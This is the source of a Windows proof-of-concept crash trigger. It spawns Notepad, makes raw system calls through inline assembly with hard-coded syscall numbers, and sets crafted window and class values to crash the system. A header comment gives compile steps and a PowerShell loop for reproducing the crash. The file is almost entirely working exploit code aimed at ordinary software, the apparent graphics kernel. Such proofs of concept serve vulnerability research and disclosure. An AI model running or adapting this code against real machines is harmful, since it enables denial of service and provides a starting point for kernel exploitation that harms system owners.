/*
 * compile:
 * cl.exe poc457.cpp user32.lib shell32.lib
 *
 * To trigger crash run the resulting executable in powershell as follows:
 * while ( 1 ) { .\poc.exe; .\poc.exe; taskkill /f /im notepad.exe }
 * 
 * If this doesn't repro after a few rounds ctrl+c and try again.
 */

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <time.h>
 
HWND notepad(LPCSTR name) {
	char filename[1024], title[1024];
	FILE *f=0x0;
	sprintf_s(filename, 1024, "%s.txt", name);
	DWORD rc = fopen_s(&f, filename, "w");
	if(rc!=0) {
		printf("[-] failed to create temporary text file\n");
	}
	fclose(f);
	HINSTANCE inst = ShellExecuteA(0x0, "open", "notepad.exe", filename, 0x0, SW_SHOW);
	if(inst < (HINSTANCE)33) {
		printf("[-] failed to start notepad\n");
	}
	while(1) {
	sprintf_s(title, 1024, "%s - Notepad", name);
	HWND hwnd = FindWindowA(0x0, title);
	if(hwnd) {
		return hwnd;
	}
	sprintf_s(title, 1024, "%s.txt - Notepad", name);
	hwnd = FindWindowA(0x0, title);
	if(hwnd) {
		//printf("[-] failed to retrieve handle to notepad window\n");
		//return 0x0;
		return hwnd;
	}
	}
	return 0x0;
}

__declspec(noinline) int __stdcall NtUserConsoleControl(DWORD d1, PVOID p, DWORD d2) {
 	__asm {
 		push d2
		push p
		push d1
		push 0x0
		mov eax, 0x1160
		mov edx, 0x7ffe0300
		call dword ptr [edx]
		add esp, 0x10
	}
}

__declspec(noinline) int __stdcall NtGdiSetBitmapDimension(DWORD d1, DWORD d2, DWORD d3, DWORD d4) {
 	__asm {
 		push d4
 		push d3
		push d2
		push d1
		push 0x0
		mov eax, 0x1112
		mov edx, 0x7ffe0300
		call dword ptr [edx]
		add esp, 0x14
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	HWND hwnd = notepad("test1");
	printf("[-] hwnd: %08x\n", hwnd);
	DWORD buf[3];
	buf[0] = 1;
	buf[1] = (DWORD)hwnd;
	buf[2] = 0xba;
	NtUserConsoleControl(2, buf, 0xc);
	NtGdiSetBitmapDimension(0,0x2f,0xbe, 0x0);
	ShowOwnedPopups(hwnd, 1);
	SetWindowLong(hwnd, -16, 0x42c10000);
	SetClassLong(hwnd, -0x1a, 0x6ba99e04);
	srand( (unsigned) time(NULL));
	Sleep(rand()%1000);
}
